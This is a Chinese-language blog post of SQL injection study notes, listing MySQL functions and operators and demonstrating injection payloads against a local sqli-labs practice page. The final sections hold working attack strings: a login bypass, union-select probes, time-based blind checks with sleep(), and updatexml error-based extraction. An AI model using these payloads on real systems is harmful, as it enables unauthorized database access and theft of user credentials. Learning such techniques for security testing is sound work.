---
layout: post
title: "1.1.1-SQL注入-SQL注入基础-Web应用框架分析-MySql注入方法逻辑运算及常用函数"
date: 2018-06-11
category: web安全
tags: sql注入 
---
## MySql常用函数及逻辑运算
### 01 常用的函数
MySql内置函数：  
https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html  

MySql注入常用函数

	函数名称 函数功能
	system_user() 系统用户名
	user() 用户名
	current_user() 当前用户名
	session_user() 连接数据库的用户名
	database() 数据库名
	version() @@version 数据库版本
	@@datadir 数据库路径
	@@basedir 数据库安装路径
	@@version_compile_os 操作系统
	count() 返回执行结果数量
	concat() 没有分隔符地连接字符串
	concat_ws() 含有分隔符地连接字符串
	group_concat() 连接一个组的所有字符串，并以逗号分隔每一条数据
	load_file() 读取本地文件
	into outfile 写文件
	ascii() 字符串的ASCII代码值
	ord() 返回字符串第一个字符的ASCII值
	mid() 返回一个字符串的一部分
	substr() 返回一个字符串的一部分
	length() 返回字符串的长度

	left() 返回字符串的最左面几个字符
	floor() 返回小于或等于x的最大整数
	rand() 返回0和1之间的一个随机数
	extractvalue() 
	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
	第二个参数：XPath_string（Xpath格式的字符串）
	作用：从目标XML中返回包含所查询值的字符串
	updatexml()
	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
	第二个参数：XPath_string（Xpath格式的字符串）
	第三个参数：new_value，String格式，替换查找到的符号条件的数据
	作用：改变文档中符合条件的节点的值
	sleep() 让此语句运行N秒钟
	if() 
	>  SELECT IF(1>2,2,3);
	-> 3
	char()
	返回整数ASCII代码字符组成的字符串
	STRCMP() 比较字符串内容
	IFNULL() 假如参数1不为NULL，则返回值为参数1，否则其返回值为参数2
	exp() 返回e的x次方

---

	运行
	select system_user(); 
	select user();
	select current_user();
	select session_user();

	select show databases;
	use security
	select database();

	select version();
	select @@version;
	select @@datadir;
	select @@basedir;
	select @@version_compile_os;
	select count(*) from users;
	select count(1) from users;

	select concat(username,password) from users;
	select concat_ws(',',username,password) from users;
	select concat_ws(0x7e,username,password) from users;//~
	select gruop_concat(username) from users;

	select 'mysql' into outfile '/tmp/mysql';
	select load_file('/tmp/mysql');

	select ascii('a');
	select ord('adkfjk'); // 字符串第一个字符的ascii
	select mid('bdkfjk',1,1); // b 从第一位开始取第一个字符
	select mid('bdkfjk',1,1); // bd
	select substr('bdkfjk',1,2); //bd
	select substr('bdkfjk',1,4); //bdkf

	select length('dfdf'); // 4

	select left('dfdfdf',2) // df
	select floor(2.4); // 2
	select floor(5.6); // 5

	select rand(); // 0~1之间随机数

	select sleep(2); 

	select if(1<2,2,3);

	char(97);

	select strcmp('a','b'); // -1 对比两个值
	select strcmp('a','a'); // 0

	select ifnull(null,1);
	select ifnull(2,1);

	select exp(2); // 自然对数e 的几次方

XPath  
http://www.w3school.com.cn/xpath/  



#### MySql运算符
算术运算符：  

* \+ 加法运算
* - 减法运算
* \* 乘法运算
* ／ 除法运算
* % 求余运算
* DIV 除法运算，同”／“
* MOD 求余运算，同”%“

比较运算符：
  
* \> 大于
* < 小于
* = 等于
* \>= 大于等于
* <= 小于等于
* != 或 <> 不等于
* IS NULL 为空
* IS NOT NULL 不为空
* BETWEEN AND 在..之间
* IN 包含
* NOT IN 不包含
* LIKE 模式匹配
* NOT LIKE 模式匹配
* REGEXP 正则表达式

逻辑运算符：  

* && 或 AND 与
* \|\| 或 OR 或
* ! 或 NOT 非
* XOR 异或


---

	select 1+2;
	
	select id,username from users where id between 1 and 4;
	
	select id,username from users where username in ('admin','tesdt');
	
	select id,username from users where username not in ('admin','tesdt');
	
	select id,username from users where username like 'admin';
	
	select id,username from users where username like '%ad%';
	
	select user() regexp 'root';
	
		
	
### 02 逻辑运算
#### 逻辑运算符： AND <--> OR

	select * from users where id=1; // true
	select * from users where id=1 and 1=1; // true
	select * from users where id=1 and 1=2; // false 返回 empty
	
	select * from users where id=1 or 1=2; // true 
	
	
---

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.jpeg)

	登录处的SQL语句：
	select * from users where username='admin' and pwd='pass';
	'or '1' = '1
	select * from users where username=''or '1'='1' and pwd=''or '1' = '1';
	

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.jpeg)

	and 1=2 union select 1,2,3-- // 1=2 false 执行union后面的语句
	select user() regexp '^ro' // ro开头的用户
	ascii(substr(select user()),1,1)=114 // 用户名为r的用户
	if(ascii(substr((select user(),1,1))=114,0,sleep(5))) // 如果用户名第一个字母是r就返回0，否则睡5秒
	(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=9) 
	updatexml(1,concat(0x7e,(select @@version),0x7e),1) // 报错信息打印版本
	
	
---

	http://127.0.0.1/Less-1/?id=1 and 1=2 union select 1,2,3--+
	http://127.0.0.1/Less-1/?id=1 and 1=2 union select 1,user(),3--+
	

